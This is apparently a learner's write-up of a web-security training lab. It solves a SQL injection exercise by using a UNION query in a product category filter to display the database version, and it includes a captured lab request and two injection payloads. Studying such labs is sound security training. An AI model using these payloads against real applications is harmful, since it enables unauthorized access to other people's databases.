---
tags:
  - sql
  - injection
---
# SQL injection attack, querying the database type and version on MySQL and Microsoft

## Instructions

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

## Solution

This lab's vulnerability also exists in the product category filter. 

```text title="Initial request"
GET /filter?category=Accessories HTTP/2
Host: 0a2000a704a6cc3882beecb30094003d.web-security-academy.net
Cookie: session=D0rDHXHnKigBaVlNS4XudF2vHwKuxnvx
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2000a704a6cc3882beecb30094003d.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Testing shows that there are two categories returned, and the following payload works to display arbitrary content.

```text title="Show arbitrary content"
Accessories' UNION SELECT null,'abc'-- -
```

![](attachments/sqli-lab-4/file-20251124113610607.png)
Now we can send the following request to print out the database version:

```text title="Print the database version"
Accessories' UNION SELECT null,@@version-- -
```

![](attachments/sqli-lab-4/file-20251124113610608.png)


